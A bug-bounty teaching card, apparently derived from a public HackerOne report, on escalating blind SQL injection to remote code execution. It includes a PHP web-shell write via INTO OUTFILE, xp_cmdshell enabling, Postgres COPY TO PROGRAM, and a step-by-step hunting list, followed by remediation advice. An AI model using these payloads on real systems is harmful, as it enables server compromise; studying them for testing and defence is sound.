---
name: sqli-to-rce
description: Blind SQLi chained to RCE via insecure deserialization / stacked queries / file-write. Teaches escalating SQLi beyond data exfil to code execution and the intermediate primitives (write file, read files, UNC/SMB, xp_cmdshell).
sources: hackerone_public
report_count: 1
---

# Blind SQLi → RCE

**Report**: QIWI — "Blind SQLi → RCE at contactws.contact-sys.com" (hackerone.com/reports/816254, critical).

## Why it matters (the new lesson)
SQLi is treated as "dump the DB". The real prize is RCE. Escalation primitives: `INTO OUTFILE` (web shell), `xp_cmdshell` (MSSQL), `LOAD_FILE`/`INTO DUMPFILE`, `COPY ... PROGRAM` (Postgres), Oracle Java/DBMS_SCHEDULER, or feeding DB data into an insecure-deserialization/unserialize() sink elsewhere. Blind SQLi can still RCE via time-based + file-write.

## How it works
- MySQL: `SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'`
- MSSQL: `EXEC xp_cmdshell 'whoami'` (after enabling).
- Postgres: `COPY (SELECT 'x') TO PROGRAM 'id'` (superuser) or `lo_export`/`COPY TO`.
- Chained: dump serialized object → feed to `unserialize()` gadget (PHP/Java).

## How to hunt for it
1. Confirm SQLi + DB type + privileges (`SELECT @@version`, `current_user()`).
2. Check `FILE` privilege (MySQL), superuser (Postgres), `xp_cmdshell` availability (MSSQL).
3. Write a webshell to a web-accessible path (find via error messages / default paths).
4. Or pivot to deserialization gadget using DB-controlled data.

## Payloads
```sql
SELECT @@version
SELECT current_user()
SELECT 'x' INTO OUTFILE '/var/www/html/p.php'
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'
COPY (SELECT 'x') TO PROGRAM 'id'
```

## Fix
Parameterized queries; least-privilege DB account (no FILE/superuser/xp_cmdshell); disable stacked queries; WAF; output encoding.
